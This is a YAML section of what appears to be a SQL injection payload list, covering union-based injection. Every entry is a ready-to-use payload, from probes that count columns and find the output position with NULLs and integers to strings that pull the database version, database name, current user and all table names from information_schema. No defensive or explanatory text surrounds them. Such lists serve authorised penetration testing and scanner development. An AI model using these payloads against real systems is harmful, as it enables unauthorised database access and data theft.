###############################################################################
# 3. UNION-BASED INJECTION
###############################################################################
union_based:
  - payload: "' UNION SELECT NULL -- -"
    description: "1-column UNION"
    technique: "union"
  - payload: "' UNION SELECT NULL,NULL -- -"
    description: "2-column UNION"
    technique: "union"
  - payload: "' UNION SELECT NULL,NULL,NULL -- -"
    description: "3-column UNION (most common)"
    technique: "union"
    tag: "common"
  - payload: "' UNION SELECT NULL,NULL,NULL,NULL -- -"
    description: "4-column UNION"
    technique: "union"
  - payload: "' UNION SELECT 1,2,3 -- -"
    description: "3-column UNION with integers to find output position"
    technique: "union_position"
    tag: "classic"
  - payload: "' UNION SELECT 1,@@version,3 -- -"
    description: "Version extraction via UNION"
    technique: "union_extract"
    tag: "common"
  - payload: "' UNION SELECT 1,database(),3 -- -"
    description: "Database name extraction"
    technique: "union_extract"
  - payload: "' UNION SELECT 1,user(),3 -- -"
    description: "Database user extraction"
    technique: "union_extract"
  - payload: "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -"
    description: "Extract all table names"
